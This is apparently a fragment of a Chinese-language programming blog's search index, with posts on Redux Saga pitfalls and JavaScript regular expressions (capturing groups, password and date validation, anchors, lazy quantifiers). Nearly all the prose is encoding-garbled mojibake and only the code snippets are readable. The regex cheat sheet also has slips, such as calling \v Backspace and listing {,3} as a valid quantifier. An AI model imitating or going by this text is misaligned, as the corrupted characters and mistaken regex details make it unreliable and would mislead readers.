è²¼åˆ‡ XD ä¸€äº›å­¸ç¿’æ™‚è¸©åˆ°çš„åœ°é›·ç¬¬ä¸€å€‹å¦‚æœä½ è·Ÿæˆ‘ä¸€æ¨£æ˜¯çœ‹ Redux Saga Beginner Tutorial ä¾†å­¸ saga çš„è©±ï¼Œä¹Ÿè¨±å°±æœƒç¢°åˆ°é€™å€‹å•é¡Œã€‚ delay é€™å€‹æ±è¥¿åœ¨ redux-saga çš„ v1 å’Œ v1 ä»¥å‰æœ‰ä¸åŒçš„å¼•å…¥æ–¹å¼ï¼Œé€™å€‹å®³æˆ‘å¡å¾ˆä¹…ã€‚ v1 å‰ï¼š 1import { delay } from 'redux-saga' v1 å¾Œï¼š 1import { delay } from 'redux-saga/effects' å¦å¤–ï¼Œé€é redux-saga/effects å¼•å…¥çš„ delay ä¸èƒ½é€é call(delay, 1000) çš„æ–¹å¼ä¾†ç”¨ï¼Œå› ç‚ºå…©å€‹çš„å€¼ä¸ä¸€æ¨£ã€‚ ä¸€å€‹æ˜¯ functionï¼Œä¸€å€‹æ˜¯ effect creatorï¼Œè€Œcall çš„ç¬¬ä¸€å€‹åƒæ•¸åªæ¥å— functionï¼Œæ‰€ä»¥æ‰ä¸å¯ä»¥é€™æ¨£ç”¨ã€‚ è©³ç´°å¯ä»¥åƒè€ƒé€™ç¯‡è¨è«–ã€‚ ç¬¬äºŒå€‹ä¸è¦æŠŠ saga ç›£è½çš„ action è·Ÿ reducer ä¸­çš„ action ææ··ï¼Œå‡è¨­æˆ‘çš„ reducer é•·é€™æ¨£ï¼š 12345678export default function counterReducer(state = 0, action) { switch (action.type) { case 'INCREMENT': return state + 1 default: return state }} æ¥è‘—æˆ‘æƒ³ç”¨ saga åšä¸€å€‹å»¶é²ä¸€ç§’å¾Œå†åŠ ä¸€çš„å‹•ä½œï¼Œé‚£æˆ‘ä¸€å®šæ˜¯é€™æ¨£å¯«ï¼š 123456export default function* rootSaga() { while (true) { yield take(\"INCREMENT_ASYNC\") yield fork(handleIncrementAsync) }} è€Œä¸æ˜¯é€™æ¨£å¯«ï¼š 1234567export default function* rootSaga() { while (true) { // è·Ÿ reducer ä¸­çš„ action åŒå yield take(\"INCREMENT\") yield fork(handleIncrementAsync) }} è¦çŸ¥é“ç”¨ saga çš„é‚è¼¯æ˜¯ï¼š åœ¨å…ƒä»¶ä¸­ dispatch ä¸€å€‹ action çµ¦ saga watcherï¼ˆä¸æ˜¯ reducderï¼‰ è§¸ç™¼ saga watcher å¾Œæœƒä¸Ÿçµ¦å°æ‡‰çš„ handler è™•ç† handler è™•ç†å®Œä»¥å¾Œï¼Œå†å¹«æˆ‘ dispatch å¦ä¸€å€‹ action åˆ° reducer å»ã€‚ æ‰€ä»¥é€™å…©å€‹ action æ˜¯å®Œå…¨ä¸ç›¸å¹²çš„æ±è¥¿ï¼Œè¦äº¤çµ¦ saga è™•ç†çš„ action çµ•å°æ˜¯å°æ‡‰åˆ° watcherï¼Œä¸æ˜¯ reducerï¼Œé€™å€‹ä¸€å®šè¦å¼„æ¸…æ¥šã€‚ å¦‚æœä½ çœŸçš„ä¸å¹¸å¯«æˆä¸€æ¨£çš„åç¨±çš„è©±ï¼Œé‚£å°±æœƒé™·å…¥ç„¡é™è¿´åœˆï¼ˆè‡ªå·±çš„å¯¦éš›ç¶“é©—ï¼‰ã€‚ åƒè€ƒè³‡æ–™ Redux Saga Beginner Tutorial å­¸ç¿’ Redux-Saga çš„èµ·æ‰‹å¼","link":"/2022/05/20/redux-saga/"},{"title":"æ­£å‰‡è¡¨é”å¼ä¹‹ã€Œæˆ‘åªæƒ³è¦ xxx è£¡é¢çš„å…§å®¹ã€","text":"æˆ‘ç›¸ä¿¡ä»¥å¾Œæœƒç”¨åˆ°å®ƒã€‚ å¸¸è¦‹çš„ä¿¡ç®±ä¾‹å­å‡è¨­æˆ‘æœ‰é€™äº›ä¿¡ç®±ï¼š aaa@gmail.com ccc@yahoo.com.tw ddd@msn.com eee@ptt.com å¦‚æœæˆ‘åªæƒ³è¦ã€Œ@ è·Ÿ .ã€ä¹‹é–“çš„æ–‡å­—ï¼Œä¹Ÿå°±æ˜¯ï¼š gamil yahoo msn ptt æ‡‰è©²æ€éº¼åšï¼Ÿ ä¸€èˆ¬å¯èƒ½æœƒæƒ³èªªç”¨ match(regExp) ä¾†åšï¼Œåƒé€™æ¨£ï¼š 123const regExp = /@[a-zA-Z]+\\./const str1 = '123@yahoo.com.tw'str1.match(regExp) çµæœå°±æ‹¿åˆ°ï¼š[ '@yahoo.', index: 3, input: '123@yahoo.com.tw', groups: undefined ] æœƒç™¼ç¾é€£ @ . ä¸€èµ·è¢«åŒ¹é…é€²ä¾†äº†ï¼Œä½†é€™ä¸æ˜¯æˆ‘è¦çš„é˜¿ï¼Œè©²æ€éº¼åšæ‰å¥½å‘¢ï¼Ÿ åœ¨æ­£å‰‡è¡¨é”å¼ä¸­æœ‰ä¸€å€‹å¾ˆå¥½ç”¨çš„æ±è¥¿å«ã€ŒCapturing Groupsã€ï¼Œæœƒç”¨ () ä¾†è¡¨ç¤ºï¼Œç°¡å–®ä¾†èªªå°±æ˜¯æŠŠ () ä¸­åŒ¹é…çš„å­—ä¸²æŠ“å‡ºä¾†ã€‚æ‰€ä»¥å¥—ç”¨å‰›å‰›çš„ä¾‹å­æœƒè®Šé€™æ¨£ï¼š 123const regExp = /@([a-zA-Z]+)\\./const str1 = '123@yahoo.com.tw'str1.match(regExp) é€™æ™‚å€™çµæœå°±ä¸ä¸€æ¨£äº†ï¼š 123456[ '@yahoo.', 'yahoo', index: 3, input: '123@yahoo.com.tw', groups: undefined] ç¬¬äºŒå€‹å…ƒç´ å°±æ˜¯æˆ‘å€‘è¦çš„çµæœäº†ã€‚ æ‰€ä»¥å›åˆ°ä¸€é–‹å§‹çš„ä¾‹å­ï¼š 12345678910const regExp = /@([a-zA-Z]+)\\./const emails = [ 'aaa@gmail.com', 'ccc@yahoo.com.tw', 'ddd@msn.com', 'eee@ptt.com']for(let email of emails) { console.log(email.match(regExp)[1])} æ­£å‰‡è¡¨é”å¼çœŸçš„æ˜¯ä¸€å€‹å¾ˆå¼·å¤§çš„æ±è¥¿ï¼ é€²éšé¡Œä¸Šé¢äº†è§£ä¹‹å¾Œï¼Œå¯ä»¥è©¦è‘—çœ‹èƒ½ä¸èƒ½ç†è§£é€™é‚Šæ®µç¨‹å¼ç¢¼åšäº†ä»€éº¼ï¼š 12345678910const regExp = /^.+@(.+?)\\./const emails = [ 'aaa@gmail.com', 'ccc@yahoo.com.tw', 'ddd@msn.com', 'eee@ptt.com']for(let email of emails) { console.log(email.match(regExp)[1])} å…¶å¯¦å°±æ˜¯æŠŠå‰›å‰›çš„ä¾‹å­å¯«å¾—æ›´å®Œæ•´ä¸€é»ï¼Œè®“å®ƒå¯ä»¥åˆ¤æ–·ä¿¡ç®±çš„æ ¼å¼æ­£ç¢ºï¼Œä¸¦ä¸”æŠŠæƒ³è¦çš„å…§å®¹ï¼ˆ@ åˆ° . ä¹‹é–“ï¼‰æŠ“å‡ºä¾†ã€‚ å…¶ä¸­ç”¨åˆ°äº† ? çš„éƒ¨åˆ†ï¼Œæ„æ€æ˜¯èªªæ‰¾å‡ºã€Œæœ€å°‘åŒ¹é…ã€ï¼Œ @yahoo. æ˜¯æœ€å°‘çš„ï¼Œ @yahoo.com. æ˜¯æœ€å¤šçš„ï¼Œè€Œé è¨­æ˜¯æœƒæ‰¾å‡ºã€Œæœ€å¤šåŒ¹é…ã€ï¼Œä½†æˆ‘å€‘è¦å°‘çš„é‚£å€‹ï¼Œæ‰€ä»¥æ‰è¦åŠ ä¸Š ?ã€‚ ä¸å¤ªæ‡‚çš„è©±å¯ä»¥åƒè€ƒï¼šæ­£å‰‡è¡¨é”å¼","link":"/2022/01/14/regular-expression-capturing-groups/"},{"title":"æ­£å‰‡è¡¨é”å¼çš„å¯¦æˆ°æ¼”ç·´","text":"æ€éº¼çŸ¥é“è‡ªå·±æœƒä¸æœƒï¼Ÿåšé¡Œç›®å°±çŸ¥é“äº†ã€‚ è·Ÿå¯†ç¢¼æœ‰é—œçš„æ ¼å¼è¨­å®šå¯†ç¢¼æ™‚å¸¸æœƒç¢°åˆ°ã€Œå¤§å°å¯«ã€ã€ã€Œæ•¸å­—ã€å’Œã€Œç‰¹æ®Šç¬¦è™Ÿã€ä¹‹é¡çš„å•é¡Œï¼Œæ‰€ä»¥é€™ç¯‡é™„ä¸Šä¸€å€‹ç¯„ä¾‹ï¼š 1234// å¿…é ˆåŒ…å«å¤§å°å¯«è‹±æ–‡ã€æ•¸å­—ã€ç‰¹æ®Šç¬¦è™Ÿï¼Œä¸”æœ€çŸ­é•·åº¦ç‚º 8const rule = `(?=.*?[a-z])(?=.*?[A-Z])(?=.*?[0-9])(?=.*?[#?!@$%^&amp;*-]).{8,}$`const regExp = new RegExp(rule)console.log(regExp.test('aaaA2a@!')) é€™æ®µè¦å‰‡å¯ä»¥æ‹†æˆé€™æ¨£ä¾†è§£è®€ï¼š è‡³å°‘ä¸€å€‹å¤§å¯«å­—æ¯ (?=.*?[A-Z]) è‡³å°‘ä¸€å€‹å°å¯«è‹±æ–‡å­—æ¯ (?=.*?[a-z]) è‡³å°‘æœ‰ä¸€ä½æ•¸å­— (?=.*?[0-9]) è‡³å°‘æœ‰ä¸€å€‹ç‰¹æ®Šå­—ç¬¦ (?=.*?[#?!@$%^&amp;*-]) æœ€å°å…«å€‹é•·åº¦ .{8,} é‚£å€‹å•é¡Œå¾ˆå¤šçš„æ—¥æœŸæ ¼å¼è«‹ä½ å»ºç«‹ä¸€å€‹å¯ä»¥é©—è­‰ 2021/12/15 é€™å€‹æ ¼å¼çš„è¦å‰‡ï¼š 12const regExp = /^\\d{4}\\/\\d{2}\\/\\d{2}$/console.log(regExp.test('2021/12/15')) // true åšçš„å¾ˆå¥½ï¼Œä½†ç¾åœ¨æœ‰äº›ä½¿ç”¨è€…æŠ±æ€¨èªªï¼šã€Œå¾ˆç…©æ¬¸ï¼Ÿæˆ‘å°±ç¿’æ…£æ‰“ã€2021-12-15ã€ä¸è¡Œå—ï¼Ÿã€ æ‰€ä»¥ç¾åœ¨ä½ è¦å»ºç«‹ä¸€å€‹å¯ä»¥æ”¯æ´ 2021/12/15 æˆ– 2021-12-15 é€™å…©å€‹æ ¼å¼çš„è¦å‰‡ï¼š 123const regExp = /^\\d{4}[\\/-]\\d{2}[\\/-]\\d{2}$/console.log(regExp.test('2021/12/15'))console.log(regExp.test('2021-12-15')) æ‹¿åˆ°çš„è³‡æ–™æ ¼å¼å¥½äº‚é€™é‚Šå‡è¨­è³‡æ–™çš„æ ¼å¼éƒ½æ˜¯ä»¥ã€Œé€£çºŒçš„è‹±æ–‡æˆ–æ•¸å­—ã€ä¾†çµ„æˆã€‚ä½†å¾ˆä¸å¹¸çš„æ˜¯ï¼Œåœ¨ä½ æ‹¿åˆ°é€™äº›è³‡æ–™çš„æ™‚å€™ï¼Œç™¼å…ˆåƒé›œäº†å¾ˆå¤šä¸å¿…è¦çš„å­—å…ƒï¼ˆé€—è™Ÿã€æ›è¡Œã€åˆ†éš”ï¼‰ï¼š 12345const data = ` sn001, sn002, sn003 ` æ‰€ä»¥è«‹ä½ æƒ³è¾¦æ³•å»ºç«‹ä¸€å€‹è¦å‰‡ï¼Œè®“æœ€å¾Œè™•è£¡å®Œå¾Œçš„è³‡æ–™æ˜¯ ['sn001', 'sn002', 'sn003'] é€™å€‹æ ¼å¼ï¼š 12345678const data = ` sn001, sn002, sn003 `const regExp = /[A-Za-z0-9]+/gconst realData = data.match(regExp)console.log(realData) å¯ä»¥å¹«æˆ‘è™•ç†ä¸€ä¸‹å—ï¼Œæˆ‘éƒ½æ”¾åœ¨ * * è£¡é¢äº†ä½ çš„å¥½æœ‹å‹é˜¿å‰æœ€è¿‘è¨­è¨ˆäº†ä¸€æ¬¾è—æ–‡éŠæˆ²ï¼Œé€™å€‹éŠæˆ²æ˜¯è¦åœ¨æ™‚é–“å…§å¾ä¸€ä¸²å‡æ–‡ä¸­æ‰¾å‡ºé—œéµå­—ï¼Œç„¶å¾ŒæŠŠé€™äº›é—œéµå­—çµ„åˆæˆä¸€æ®µå®Œæ•´çš„å¥å­ã€‚ é˜¿å‰ç‚ºäº†æ€•è‡ªå·±å“ªå¤©å›ä¾†çœ‹çš„æ™‚å€™æ‰¾å€‹è€åŠå¤©ï¼Œé˜¿å‰åœ¨è‡ªå·±çš„è‰æ¡ˆè£¡éƒ½æœƒç”¨ * ä¾†æŠŠé—œéµå­—çµ¦æ¨™è¨˜èµ·ä¾†ã€‚ ç¾åœ¨é˜¿å‰çŸ¥é“ä½ å‰›å­¸äº†æ­£è¦è¡¨é”å¼ï¼Œæ‰€ä»¥å¸Œæœ›ä½ å¹«å¿™å¯«ä¸€å€‹ç¨‹å¼ï¼Œå¯ä»¥è®“ä»–æŠŠã€ŒåŒ…åœ¨ *...* çš„æ–‡å­—çµ¦å–å‡ºä¾†ã€ï¼Œå¥½è®“ä»–æ¯æ¬¡å¯ä»¥å°‘æ‰ 50% çš„æ™‚é–“åœ¨æª¢æŸ¥è‡ªå·±çš„è—æ–‡å­—éŠæˆ²ã€‚ 1234const paragraph = `Lorem Ipsum *star* is simply dummy text of the *burst* and *stream* industry.`const regExp = /\\*.*?\\*/gconsole.log(paragraph.match(regExp)) //&nbsp;['*star*', '*burst*', '*stream*']","link":"/2021/12/15/regular-expression-exercises/"},{"title":"æ€éº¼ç”¨æ­£å‰‡è¡¨é”å¼é™åˆ¶é€£çºŒæ¬¡æ•¸","text":"è¦ºå¾—é‚„è »é™·é˜±çš„æ±è¥¿ã€‚ é‡è¦è§€å¿µå¦‚æœä½ æœ‰é™åˆ¶ä¸Šé™æˆ–ä¸‹é™çš„è¦å‰‡çš„éœ€æ±‚ï¼Œä¾‹å¦‚èªªã€Œæœ€å¤šå‡ºç¾ 2 å€‹è‹±æ–‡å­—ã€æˆ–æ˜¯ã€Œæœ€å¤š 8 å€‹æ•¸å­—ã€ä¹‹é¡çš„ï¼Œé‚£ä½ ä¸€å®šè¦ç”¨ ^ æˆ– $ ä¾†å»ºç«‹å­—é¦–è·Ÿå­—å°¾çš„è¦å‰‡ï¼Œæ‰æœ‰è¾¦æ³•çœŸçš„é™åˆ¶åœ¨ã€Œä½ æŒ‡å®šçš„ç¯„åœã€ã€‚ åƒè€ƒä¸‹é¢çš„ä¾‹å­æœƒæ¯”è¼ƒå¥½ç†è§£ã€‚ 1. èº«åˆ†è­‰è™Ÿç¢¼å‡è¨­è¦å‰‡æ˜¯ã€Œé–‹é ­ A åˆ° Zï¼ŒåŠ ä¸Š 9 å€‹é€£çºŒæ•¸å­—ã€ï¼Œä½ å¿…é ˆé€™æ¨£å¯«ï¼š 123const rule = /^[A-Z][0-9]{9}$/console.log(rule.test('A123456789')) // trueconsole.log(rule.test('A1234567891011')) // false å¦‚æœä¸é€™æ¨£å¯«ï¼Œç¾åœ¨æŠŠ $ æ‹¿æ‰çš„è©±ï¼Œè¶…å‡º 9 å€‹æ•¸å­—ä¹Ÿæœƒå¾—åˆ° trueï¼š 123const rule = /^[A-Z][0-9]{9}/console.log(rule.test('A123456789')) // trueconsole.log(rule.test('A1234567891011')) // true ç‚ºä»€éº¼æœƒé€™æ¨£ï¼Ÿ ä½ å¯èƒ½æœƒæƒ³èªªä¸æ˜¯ã€ŒA-Z é–‹é ­å¾Œé¢è·Ÿè‘—é€£çºŒ 9 å€‹æ•¸å­—ã€é€™å€‹è¦å‰‡å—ï¼Ÿé€™æ˜¯å› ç‚ºæ­£å‰‡è¡¨é”å¼æ‰€é…å°çš„æ˜¯ã€Œéƒ¨åˆ†ã€çš„å­—ä¸²ï¼Œæ„æ€æ˜¯èªªåªè¦å­—ä¸²è£¡é¢æœ‰ä¸€éƒ¨åˆ†ç¬¦åˆï¼Œå°±æœƒè¢«åŒ¹é…åˆ°ã€‚ A1234567891011 è£¡é¢çš„ A123456789 ç¬¦åˆè¦å‰‡ï¼Œæ‰€ä»¥æ‰èƒ½é…å°æˆåŠŸã€‚ å°±åƒå¦‚æœæœ‰å€‹è¦å‰‡æ˜¯ï¼š/\\d{9}/ åŒ¹é…ã€Œé€£çºŒä¹å€‹æ•¸å­—ã€çš„å­—ä¸²ã€‚ç•¶æ•¸å­—æ˜¯ 1234567891011 æ™‚ï¼Œè£¡é¢çš„ 123456789 çš„é€£çºŒ 9 å€‹æ•¸å­—ï¼Œåªçœ‹ 567891011 çš„è©±ä¹Ÿç¬¦åˆé€£çºŒ 9 å€‹æ•¸å­—ã€‚åªè¦èƒ½æ’æˆ 9 å€‹é€£çºŒçš„æ•¸å­—éƒ½æœƒè¢«ç•¶ä½œç¬¦åˆã€‚ è€ŒåŠ ä¸Š $ å°±èƒ½å¤ é™åˆ¶çš„åŸå› æ˜¯å› ç‚ºè¦å‰‡è®Šæˆï¼šä»¥é€£çºŒ 9 å€‹æ•¸å­—çµå°¾ é€™å€‹ã€Œçµå°¾ã€æ˜¯ä¸€å€‹å¾ˆé‡è¦çš„è¦å‰‡ï¼Œå› ç‚ºé€™æœƒè®“è¦å‰‡è®Šæˆä¸€å®šè¦ã€Œçµå°¾å‰›å¥½å‡ºç¾ 9 å€‹æ•¸å­—ã€æ‰æœƒç¬¦åˆã€‚1234567891011 æ²’è¾¦æ³•å†åƒå‰›å‰›ä¸€æ¨£æ‹†æˆ 123456789 æˆ– 567891011ï¼Œå› ç‚ºé‚£éƒ½ä¸ç¬¦åˆä»¥é€£çºŒ 9 å€‹æ•¸å­— çµå°¾ çš„é€™å€‹è¦å‰‡ã€‚ 2. æ‰‹æ©Ÿè™Ÿç¢¼æ¥ä¸‹ä¾†æ˜¯åšå€‹å¯¦éš›ç·´ç¿’ï¼Œè«‹å…ˆè©¦è‘—å…ˆè‡ªå·±æ€è€ƒï¼Œåœ¨çœ‹è§£ç­”ã€‚ å‡è¨­æ‰‹æ©Ÿè™Ÿç¢¼çš„è¦å‰‡æ˜¯ã€Œ09 é–‹é ­ + 8 å€‹é€£çºŒæ•¸å­—ã€è©²æ€éº¼å¯«ï¼Ÿ 123const rule = /^09[0-9]{8}$/console.log(rule.test('0912345678')) // trueconsole.log(rule.test('091234567890')) // false å¦‚æœèƒ½é †åˆ©è§£å‡ºä¾†çš„è©±æ‡‰è©²å°±æ²’ä»€éº¼å•é¡Œäº†ã€‚ åšå€‹æœ€å¾Œçš„è£œå……ï¼Œæœ‰æ™‚å€™ä½ å¯èƒ½æœƒå¯«åˆ°æ··æ·†ï¼Œæ‰€ä»¥æœƒæƒ³èªª 09 å‰é¢çš„ ^ æ˜¯ä¸æ˜¯å¯ä»¥æ‹¿æ‰ï¼Ÿä½†æ­£ç¢ºç­”æ¡ˆæ˜¯ ä¸å¯ä»¥ï¼Œå¦‚æœæ‹¿æ‰çš„è©±æœƒè®Šæˆ AA0912345678 ä¹Ÿèƒ½å¾—åˆ° trueã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œæ­£å‰‡è¡¨é”å°±æ˜¯ä¸€å€‹å¤šå¯«å¤šç·´ç¿’æœƒæ¯”è¼ƒæŠ“åˆ°æ„Ÿè¦ºçš„æ±è¥¿ QQ","link":"/2021/12/27/regular-expression-set-range/"},{"title":"æ­£å‰‡è¡¨é”å¼","text":"ä¸è¶•å¿«å›ä¾†å¡«é€™å€‹å‘ä¸è¡Œã€‚ ä¸€äº›ä¸éŒ¯ç”¨çš„ç¶²ç«™ regexperï¼ˆæä¾›åœ–å½¢åŒ–ä»‹é¢ï¼‰ ihateregexï¼ˆæä¾›ä¸€äº›ç¾æˆç¯„ä¾‹ï¼‰ html5patternï¼ˆæä¾›ä¸€äº›ç¾æˆç¯„ä¾‹ï¼‰ regexï¼ˆå¯æ¸¬è©¦ + çµæ§‹åˆ†æ ğŸ‘ï¼‰ åœ¨ JavaScript ä¸­ä½¿ç”¨ Regex æ­£è¦è¡¨ç¤ºå¼ï¼šæ‡¶äºº Cheat Sheet å‚™å¿˜å–® ä»€éº¼æ˜¯æ­£å‰‡è¡¨é”å¼ï¼Ÿæ­£å‰‡è¡¨é”å¼ï¼ˆRegExp, Regular Expressionï¼‰å°±æ˜¯ç”¨ä¾†æª¢æŸ¥æŸä¸€å€‹å­—ä¸²æ˜¯å¦ç¬¦åˆã€Œä¸€å€‹è¦å‰‡ã€ã€‚ æˆ‘å€‘æœƒç”¨ RegExp ä¾†å»ºç«‹ä¸€å€‹è¦å‰‡ï¼Œåˆ©ç”¨é€™å€‹è¦å‰‡å°±å¯ä»¥å°å­—ä¸²åšæª¢æ¸¬ã€‚ å»ºç«‹æ–¹å¼RegExp æ˜¯ä¸€å€‹ç‰©ä»¶ï¼Œå¯ä»¥ç”¨ // æˆ– new RegExp() ä¾†å»ºç«‹ã€‚ æª¢æ¸¬æ–¹æ³•test() æª¢æŸ¥åƒæ•¸æ˜¯å¦ç¬¦åˆæ­£è¦è¡¨é”å¼çš„è¦å‰‡ï¼š 12const regExp = /a/regExp.test('aabbccss') // ture ä¸Šé¢çš„è¦å‰‡æ˜¯ã€Œåªè¦æœ‰ a å­—å…ƒã€å°±ç®—é€šéã€‚ æ€éº¼è¨­å®šè¦å‰‡ ^ èµ·å§‹å­—ä¸²çš„è¦å‰‡ $ çµå°¾å­—ä¸²çš„è¦å‰‡ . ã€Œå–®å€‹ã€ä»»æ„å­—å…ƒçš„è¦å‰‡ã€‚é™¤äº† \\nï¼ˆæ›è¡Œï¼‰è·Ÿ \\r \\u2028 \\u2029 é€™äº› ä¸å¯è¦‹å­—å…ƒ \\ è·³è„«å­—å…ƒã€‚æŠŠæœƒæœ‰è¡çªçš„å­—å…ƒç•¶æˆç´”å­—ä¸²ï¼Œä¾‹å¦‚ï¼š/\\$100/ /2021\\/12\\/15/ \\d ä»»æ„æ•¸å­—çš„è¦å‰‡ \\D é™¤äº†æ•¸å­—ä»¥å¤–çš„è¦å‰‡ \\w ä»»æ„è‹±æ–‡ã€æ•¸å­—ã€åº•ç·šçš„è¦å‰‡ \\W é™¤äº†ä»»æ„è‹±æ–‡ã€æ•¸å­—ã€åº•ç·šä»¥å¤–çš„è¦å‰‡ \\s ä»»æ„ç©ºç™½å­—å…ƒã€‚åŒ…å« \\f \\n \\r \\t \\v é€™äº› ä¸å¯è¦‹å­—å…ƒã€‚ \\S éä»»æ„ç©ºç™½å­—å…ƒï¼ˆåŒä¸Šï¼‰çš„è¦å‰‡ | æ»¿è¶³å…¶ä¸­ä¸€å€‹æ¢ä»¶å°± OK çš„è¦å‰‡ - è‡ªè¨‚ç¯„åœçš„è¦å‰‡ã€‚åƒ 1 ~ 5 å¯ä»¥å¯«æˆ [1-5]ï¼›a ~ d å¯ä»¥å¯«æˆ [a-d] [] åŒ…å«æ‹¬å¼§å…§æ–‡å­—çš„è¦å‰‡ï¼ˆå‡ºç¾ä¸€å€‹å°±ç®—ç¬¦åˆï¼‰ã€‚ä¾‹å¦‚ï¼š/a[bcd]b/ã€Œab å¤¾ bcdã€éƒ½å¯ä»¥ã€‚ [^] ä¸åŒ…å«æ‹¬å¼§å…§æ–‡å­—çš„è¦å‰‡ã€‚ä¾‹å¦‚ï¼š/a[^bcd]b/ã€Œab ä¸å¤¾ bcdã€éƒ½å¯ä»¥ã€‚ {n, m} é€£çºŒå‡ºç¾æ¬¡æ•¸çš„è¦å‰‡ï¼Œn ç‚ºä¸‹é™ï¼Œm ç‚ºä¸Šé™ã€‚é‡é»æ˜¯ã€Œé€£çºŒã€é€™å€‹åŠŸèƒ½ã€‚ /\\d{3}/ ä»£è¡¨å¿…é ˆé€£çºŒå‡ºç¾ 3 æ¬¡ä»¥ä¸Šæ‰å¯ä»¥ã€‚ {0,3} ä»£è¡¨æœ€å°‘é€£çºŒ 0 æ¬¡ï¼Œæœ€å¤šé€£çºŒ 3 æ¬¡ {1,} ä»£è¡¨è‡³å°‘é€£çºŒ 1 æ¬¡ {,3} ä»£è¡¨æœ€å¤šé€£çºŒ 3 æ¬¡ã€‚ ? ä»£è¡¨åªå‡ºç¾ 0 æˆ– 1 æ¬¡çš„è¦å‰‡ï¼Œç­‰åŒæ–¼ {0,1} * ä»£è¡¨å‡ºç¾ 0 æˆ– å¤šæ¬¡çš„è¦å‰‡ï¼Œç­‰åŒæ–¼ {0,} + ä»£è¡¨è‡³å°‘å‡ºç¾ 1 æ¬¡çš„è¦å‰‡ï¼Œç­‰åŒæ–¼ {1,} è£œå……ä¸€ä¸‹ï¼Œ? * + éƒ½åªçœ‹ä»–å‰é¢é‚£ã€Œä¸€å€‹ã€å­—å…ƒã€‚ ä¸å¯è¦‹å­—å…ƒçš„è£œå……ï¼š \\v å‚ç›´è£½è¡¨ç¬¦ï¼Œå¯ä»¥æƒ³æˆæ˜¯ tab çš„åæ–¹å‘ \\r å›è»Šï¼Œæ˜¯ã€ŒEnterã€ \\v Backspaceï¼Œ æ˜¯ã€Œå€’é€€éµã€ ä¿®é£¾ç¬¦ï¼ˆå¯«åœ¨ // å¾Œé¢ï¼‰æ­£ç¢ºçš„åç¨±æ˜¯ã€Œflagï¼ˆæ¨™èªŒï¼‰ã€ï¼Œä½†ç°¡å–®ä¸€é»å¯ä»¥æƒ³æˆæ˜¯ã€Œåƒæ•¸ã€ã€‚ g æ¯”è¼ƒæ‰€æœ‰å­—ä¸²ï¼ˆglobalï¼‰ï¼Œé è¨­æ˜¯æ‰¾åˆ°ç¬¬ä¸€å€‹ç¬¦åˆçš„å°è±¡å°±åœæ­¢äº†ï¼ˆé€™å€‹ç²‰é‡è¦å“¦ï¼Œæ­ String æ–¹æ³•çš„æ™‚å€™é€šå¸¸æœƒç”¨åˆ°ï¼‰ i ä¸åˆ†å¤§å°å¯«ï¼ˆignore caseï¼‰ m å€åˆ†æ›è¡Œï¼ˆmulti lineï¼‰ï¼Œæœƒç”¨åœ¨è¦æª¢æŸ¥çš„å­—å°¾å¾Œé¢å‰›å¥½æœ‰ä¸€å€‹æ›è¡Œç¬¦è™Ÿçš„æƒ…æ³ 1234const regExpA = /y$/const regExpB = /y$/mregExpA.test('enjoy\\n') // falseregExpB.test('enjoy\\n') // true ä¸€äº›é‡è¦çš„è§€å¿µåŒ¹é…çš„æ˜¯ã€Œéƒ¨åˆ†ã€å…§å®¹12const regex = /\\d{3,5}/regex.test('12ab1234567') true åœ¨æˆ‘ç·´ç¿’æ™‚ï¼Œæˆ‘å¯«äº† /\\d{3,5}/ï¼ŒåŸæœ¬ä»¥ç‚ºæ„æ€æ˜¯ã€Œæœ€å°‘é€£çºŒ 3 æ¬¡ï¼Œæœ€å¤šé€£çºŒ 5 æ¬¡ã€ï¼Œæ‰€ä»¥æƒ³èªªä¸Šé¢çš„æ•¸å­—è¶…é 5 æ¬¡äº†ï¼Œæ‡‰è©²æœƒå¾—åˆ° falseã€‚ ä½†æ˜¯æ­£å‰‡è¡¨é”å¼åŒ¹é…çš„æ˜¯å­—ä¸²ä¸­çš„ã€Œéƒ¨åˆ†ã€å…§å®¹ï¼Œæ‰€ä»¥ä¸Šé¢çš„å­—ä¸²ä¸­å¯ä»¥åˆ°åŒ¹é…çš„æ˜¯ï¼š 123 1234 12345 234 2345 23456 â€¦ ä»¥æ­¤é¡æ¨ å¦‚æœä½ æƒ³æ­£ç¢ºçš„ä½¿ç”¨ {} çš„ä¸Šä¸‹é™è¦å‰‡ï¼Œè«‹åƒè€ƒä¸‹é¢çš„ä¾‹å­ã€‚ {n,m} è¨­å®šä¸Šä¸‹é™çš„åŠŸèƒ½é€šå¸¸æ˜¯ç”¨åœ¨ã€Œå¤¾åœ¨ä¸­é–“ã€çš„æƒ…å½¢ï¼š 123456// éƒ¨åˆ†å­—ä¸²ä¸­åŒ…å«ã€Œac ... bã€çš„å­—ä¸²const regExp = /ac{1,3}b/regExp.test('acb') // trueregExp.test('accb') // trueregExp.test('acccb') // trueregExp.test('accccb') // false æˆ–è€…æ˜¯ç›´æ¥åŠ ä¸Š ^ $ ä¾†è¨­å®šé–‹é ­è·Ÿçµå°¾æ¢ä»¶ï¼š 12345const regExp = /^\\d{1,3}$/regExp.test('1') // trueregExp.test('12') // trueregExp.test('123') // trueregExp.test('1234') // false é‡è©æ­é… ? çš„ç”¨æ³•ï¼ˆé‡è©æŒ‡çš„æ˜¯ {n,m} + * ? é€™å¹¾å€‹ï¼‰ ç”¨ä¾‹å­è§£èªªæ¯”è¼ƒæ¸…æ¥šï¼š 123const text = `Lorem Ipsum *star* is simply dummy text of the *burst* and *stream* industry.`const regExp = /\\*.{0,100}\\*/gtext.match(regExp) // ? å¦‚æœä½ é€™æ¨£å¯«çš„è©±ï¼Œæ„æ€æ˜¯ã€Œ* ä¹‹é–“å¯ä»¥å¤¾ 0 ~ 100 å€‹é€£çºŒçš„ä»»æ„å­—å…ƒã€ï¼Œä¸éé€™æ¨£å­å…¶å¯¦æœ‰ä¸€å€‹ä»¥ä¸Šçš„ç¬¦åˆçµæœï¼š *star is simply dummy text of the burst and stream* *star is simply dummy text of the burst and * *star is simply dummy text of the burst* *star* åœ¨é‡è©æ²’æœ‰æ­é… ? ä¾†ä½¿ç”¨çš„æ™‚å¾Œï¼Œtext.match(regExp) çš„çµæœæœƒæ˜¯ ['*star* is simply dummy text of the *burst* and *stream*']ï¼Œé€™æ˜¯å› ç‚ºé‡è©é è¨­æœƒå…ˆå¾åŒ¹é…æ•¸é‡ã€Œæœ€å¤šã€çš„é‚£å€‹é–‹å§‹æŠ“ã€‚æ‰€ä»¥ match æœƒå…ˆæ‹¿åˆ°ç¬¬ä¸€å€‹çµæœï¼Œä¸¦å›å‚³å°æ‡‰çš„é™£åˆ—ã€‚ å¦‚æœç¾åœ¨åŠ 